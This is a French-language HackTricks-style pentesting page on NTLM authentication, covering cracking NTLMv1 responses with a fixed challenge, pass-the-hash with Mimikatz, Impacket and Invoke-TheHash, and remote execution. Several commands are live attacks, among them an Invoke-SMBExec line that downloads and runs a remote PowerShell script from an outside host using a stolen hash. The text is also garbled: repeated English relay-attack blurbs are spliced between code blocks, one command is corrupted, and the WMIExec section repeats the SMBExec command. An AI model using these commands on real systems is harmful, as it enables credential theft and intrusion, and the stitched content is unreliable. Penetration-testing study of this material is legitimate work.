# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Vous voulez voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

**Informations d'identification NTLM** : Nom de domaine (le cas échéant), nom d'utilisateur et hachage de mot de passe.

**LM** est uniquement **activé** dans **Windows XP et Server 2003** (les hachages LM peuvent être craqués). Le hachage LM AAD3B435B51404EEAAD3B435B51404EE signifie que LM n'est pas utilisé (c'est le hachage LM de la chaîne vide).

Par défaut, **Kerberos** est **utilisé**, donc NTLM ne sera utilisé que s'il n'y a pas de **Active Directory configuré**, que le **domaine n'existe pas**, que **Kerberos ne fonctionne pas** (mauvaise configuration) ou que le **client** qui tente de se connecter utilise l'adresse IP au lieu d'un nom d'hôte valide.

Les **paquets réseau** d'une **authentification NTLM** ont l'en-tête "**NTLMSSP**".

Les protocoles : LM, NTLMv1 et NTLMv2 sont pris en charge dans la DLL %windir%\Windows\System32\msv1\_0.dll

## LM, NTLMv1 et NTLMv2

Vous pouvez vérifier et configurer quel protocole sera utilisé :

### Interface graphique

Exécutez _secpol.msc_ -> Stratégies locales -> Options de sécurité -> Sécurité réseau : Niveau d'authentification LAN Manager. Il y a 6 niveaux (de 0 à 5).

![](<../../.gitbook/assets/image (92).png>)

### Registre

Cela définira le niveau 5 :
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valeurs possibles :
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Schéma d'authentification de base NTLM Domain

1. L'**utilisateur** introduit ses **informations d'identification**
2. La machine cliente **envoie une demande d'authentification** en envoyant le **nom de domaine** et le **nom d'utilisateur**
3. Le **serveur** envoie le **défi**
4. Le **client chiffre** le **défi** en utilisant le hachage du mot de passe comme clé et l'envoie en réponse
5. Le **serveur envoie** au **contrôleur de domaine** le **nom de domaine, le nom d'utilisateur, le défi et la réponse**. Si **aucun** annuaire Active Directory n'est configuré ou si le nom de domaine est le nom du serveur, les informations d'identification sont vérifiées **localement**.
6. Le **contrôleur de domaine vérifie si tout est correct** et envoie les informations au serveur

Le **serveur** et le **contrôleur de domaine** peuvent créer un **canal sécurisé** via le serveur **Netlogon** car le contrôleur de domaine connaît le mot de passe du serveur (il est à l'intérieur de la base de données **NTDS.DIT**).

### Schéma d'authentification NTLM local

L'authentification est similaire à celle mentionnée **précédemment mais** le **serveur** connaît le **hachage de l'utilisateur** qui tente de s'authentifier dans le fichier **SAM**. Ainsi, au lieu de demander au contrôleur de domaine, le **serveur vérifiera lui-même** si l'utilisateur peut s'authentifier.

### Défi NTLMv1

La **longueur du défi est de 8 octets** et la **réponse fait 24 octets** de long.

Le **hachage NT (16 octets)** est divisé en **3 parties de 7 octets chacune** (7B + 7B + (2B+0x00\*5)): la **dernière partie est remplie de zéros**. Ensuite, le **défi** est **chiffré séparément** avec chaque partie et les **octets chiffrés résultants sont joints**. Total : 8B + 8B + 8B = 24 octets.

**Problèmes** :

* Manque de **randomisation**
* Les 3 parties peuvent être **attaquées séparément** pour trouver le hachage NT
* **DES est crackable**
* La 3ème clé est toujours composée de **5 zéros**.
* Avec le **même défi**, la **réponse** sera la **même**. Ainsi, vous pouvez donner comme **défi** à la victime la chaîne "**1122334455667788**" et attaquer la réponse en utilisant des **tables arc-en-ciel précalculées**.

### Attaque NTLMv1

De nos jours, il est de moins en moins courant de trouver des environnements avec une Délégation non contrainte configurée, mais cela ne signifie pas que vous ne pouvez pas **abuser d'un service de spouleur d'impression** configuré.

Vous pourriez abuser de certaines informations d'identification/sessions que vous avez déjà sur l'AD pour **demander à l'imprimante de s'authentifier** contre un **hôte sous votre contrôle**. Ensuite, en utilisant `metasploit auxiliary/server/capture/smb` ou `responder`, vous pouvez **définir le défi d'authentification sur 1122334455667788**, capturer la tentative d'authentification, et si elle a été effectuée en utilisant **NTLMv1**, vous pourrez la **craquer**.\
Si vous utilisez `responder`, vous pourriez essayer d'utiliser le drapeau `--lm` pour tenter de **réduire** l'**authentification**.\
_Notez que pour cette technique, l'authentification doit être effectuée en utilisant NTLMv1 (NTLMv2 n'est pas valide)._

Rappelez-vous que l'imprimante utilisera le compte d'ordinateur lors de l'authentification, et les comptes d'ordinateur utilisent des **mots de passe longs et aléatoires** que vous **ne pourrez probablement pas craquer** en utilisant des **dictionnaires courants**. Mais l'authentification **NTLMv1** utilise **DES** ([plus d'informations ici](./#ntlmv1-challenge)), donc en utilisant certains services spécialement dédiés au craquage de DES, vous pourrez la craquer (vous pourriez utiliser [https://crack.sh/](https://crack.sh) par exemple).

### Attaque NTLMv1 avec hashcat

NTLMv1 peut également être cassé avec l'outil NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) qui formate les messages NTLMv1 d'une manière qui peut être cassée avec hashcat.

La commande
```
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
## NTLM Relay Attack

### Introduction

In an NTLM relay attack, an attacker intercepts an authentication attempt from a victim and relays it to a target server to gain unauthorized access. This attack takes advantage of the NTLM authentication protocol's design weaknesses.

### How it Works

1. The attacker intercepts an NTLM authentication request from a victim to a server.
2. The attacker relays this request to another server, tricking it into believing the request is legitimate.
3. The second server responds to the attacker, who then forwards the response to the victim.
4. The victim's machine mistakenly believes it is communicating with the original server, allowing the attacker to gain unauthorized access.

### Mitigation

To prevent NTLM relay attacks, consider implementing the following measures:

- **Enforce SMB Signing:** Require SMB signing to prevent tampering with authentication traffic.
- **Use Extended Protection for Authentication:** Helps protect against NTLM relay attacks by requiring channel binding tokens.
- **Enable LDAP Signing and Channel Binding:** Adds an extra layer of security to LDAP authentication.
- **Disable NTLM:** Consider disabling NTLM authentication in favor of more secure protocols like Kerberos.

By implementing these measures, you can significantly reduce the risk of falling victim to NTLM relay attacks.
```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM Relay Attack

## Description

An NTLM relay attack is a type of attack where an attacker captures the NTLM authentication request from a victim's computer and relays it to another server to authenticate as the victim. This attack can be used to gain unauthorized access to systems and resources on a network.

## How it works

1. The attacker captures the NTLM authentication request from the victim's computer.
2. The attacker relays the captured request to another server.
3. The server authenticates the request, thinking it is coming from the victim's computer.
4. The attacker gains unauthorized access to the server or resources.

## Mitigation

To mitigate NTLM relay attacks, it is recommended to:
- Use SMB signing to prevent tampering with authentication requests.
- Implement Extended Protection for Authentication to protect against relay attacks.
- Disable NTLM authentication in favor of more secure protocols like Kerberos.

By following these mitigation techniques, organizations can reduce the risk of falling victim to NTLM relay attacks.
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Exécutez hashcat (la distribution est meilleure via un outil tel que hashtopolis) car cela prendra plusieurs jours sinon.
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Dans ce cas, nous savons que le mot de passe est "password", donc nous allons tricher à des fins de démonstration :
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Nous devons maintenant utiliser les utilitaires hashcat pour convertir les clés DES craquées en parties du hash NTLM :
```
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
## NTLM

### Overview

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used for single sign-on and is the default authentication protocol in Windows environments.

### Weaknesses

NTLM has several weaknesses that make it vulnerable to attacks, including:

- **Pass-the-Hash**: Attackers can use the hash of a user's password to authenticate as that user without knowing the actual password.
- **Pass-the-Ticket**: Attackers can use stolen ticket-granting tickets to authenticate to services as a legitimate user.
- **Relay Attacks**: Attackers can relay authentication attempts to other services, allowing them to impersonate users.

### Hardening

To mitigate the risks associated with NTLM, consider the following hardening techniques:

- **Disable NTLM**: Whenever possible, disable NTLM authentication in favor of more secure protocols like Kerberos.
- **Enforce SMB Signing**: Require SMB signing to prevent man-in-the-middle attacks on NTLM authentication.
- **Enable LDAP Signing**: Enable LDAP signing to protect against man-in-the-middle attacks on LDAP traffic using NTLM.
- **Use Extended Protection for Authentication**: Enable Extended Protection for Authentication to prevent NTLM relay attacks.
- **Implement Credential Guard**: Use Credential Guard to protect NTLM hashes and prevent pass-the-hash attacks.

By implementing these hardening techniques, you can improve the security of your Windows environment and reduce the risk of NTLM-related attacks.
```
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
### NTLM Relay Attack

---

#### Overview

In an NTLM relay attack, the attacker forwards an authentication request from a victim's machine to a target machine, tricking the target into thinking the request is coming from a legitimate user. This allows the attacker to gain unauthorized access to the target machine using the victim's credentials.

#### Steps to Perform NTLM Relay Attack

1. **Capture NTLM Authentication Request**: Use tools like Responder or Inveigh to capture NTLM authentication requests on the network.

2. **Forward the Request**: Relay the captured authentication request to the target machine using tools like ntlmrelayx or CrackMapExec.

3. **Execute Attack**: Once the target machine receives the forwarded request, it will authenticate the attacker as the victim, granting unauthorized access.

#### Mitigation Techniques

- **Enforce SMB Signing**: By enabling SMB signing, you can prevent attackers from relaying NTLM authentication requests.
  
- **Use LDAP Signing**: Implement LDAP signing to protect against NTLM relay attacks over LDAP connections.

- **Enable Extended Protection for Authentication**: This feature in Windows helps prevent NTLM relay attacks by adding an extra layer of security to the authentication process.

By implementing these mitigation techniques, you can protect your network from NTLM relay attacks and enhance its overall security.
```
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### Défi NTLMv2

La **longueur du défi est de 8 octets** et **2 réponses sont envoyées** : l'une fait **24 octets** de long et la longueur de **l'autre** est **variable**.

**La première réponse** est créée en chiffrant en utilisant **HMAC\_MD5** la **chaîne** composée par le **client et le domaine** et en utilisant comme **clé** le **hash MD4** du **hash NT**. Ensuite, le **résultat** sera utilisé comme **clé** pour chiffrer en utilisant **HMAC\_MD5** le **défi**. Pour cela, **un défi client de 8 octets sera ajouté**. Total : 24 B.

La **deuxième réponse** est créée en utilisant **plusieurs valeurs** (un nouveau défi client, un **horodatage** pour éviter les **attaques de rejeu**...)

Si vous avez un **pcap qui a capturé un processus d'authentification réussi**, vous pouvez suivre ce guide pour obtenir le domaine, le nom d'utilisateur, le défi et la réponse et essayer de craquer le mot de passe : [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Une fois que vous avez le hash de la victime**, vous pouvez l'utiliser pour **l'impersonner**.\
Vous devez utiliser un **outil** qui va **effectuer** l'**authentification NTLM en utilisant** ce **hash**, **ou** vous pourriez créer une nouvelle **sessionlogon** et **injecter** ce **hash** à l'intérieur du **LSASS**, ainsi lorsque toute **authentification NTLM est effectuée**, ce **hash sera utilisé**. La dernière option est ce que fait mimikatz.

**N'oubliez pas que vous pouvez également effectuer des attaques Pass-the-Hash en utilisant des comptes d'ordinateur.**

### **Mimikatz**

**Doit être exécuté en tant qu'administrateur**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Cela lancera un processus qui appartiendra aux utilisateurs ayant lancé mimikatz mais internement dans LSASS, les informations d'identification enregistrées sont celles à l'intérieur des paramètres de mimikatz. Ensuite, vous pouvez accéder aux ressources réseau comme si vous étiez cet utilisateur (similaire à l'astuce `runas /netonly` mais vous n'avez pas besoin de connaître le mot de passe en texte clair).

### Pass-the-Hash depuis linux

Vous pouvez obtenir l'exécution de code sur des machines Windows en utilisant Pass-the-Hash depuis Linux.\
[**Accédez ici pour apprendre comment le faire.**](../../windows/ntlm/broken-reference/)

### Outils compilés Windows Impacket

Vous pouvez télécharger [les binaires Impacket pour Windows ici](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (Dans ce cas, vous devez spécifier une commande, cmd.exe et powershell.exe ne sont pas valides pour obtenir un shell interactif) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Il existe plusieurs autres binaires Impacket...

### Invoke-TheHash

Vous pouvez obtenir les scripts PowerShell d'ici: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

#### Appeler-WMIExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

#### Appeler-SMBClient
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

#### Appeler-SMBEnum
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Cette fonction est un **mélange de toutes les autres**. Vous pouvez passer **plusieurs hôtes**, **exclure** certains et **sélectionner** l'**option** que vous souhaitez utiliser (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si vous sélectionnez **l'une quelconque** des options **SMBExec** et **WMIExec** mais que vous ne fournissez **aucun** paramètre _**Commande**_, il vérifiera simplement si vous avez **suffisamment de permissions**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Éditeur de crédentials Windows (WCE)

**Doit être exécuté en tant qu'administrateur**

Cet outil fera la même chose que mimikatz (modifier la mémoire LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Exécution à distance manuelle sur Windows avec nom d'utilisateur et mot de passe

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Extraction d'informations d'identification à partir d'un hôte Windows

**Pour plus d'informations sur** [**comment obtenir des informations d'identification à partir d'un hôte Windows, vous devriez lire cette page**](broken-reference)**.**

## NTLM Relay et Responder

**Consultez un guide détaillé sur la façon d'effectuer ces attaques ici:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Analyser les défis NTLM à partir d'une capture réseau

**Vous pouvez utiliser** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
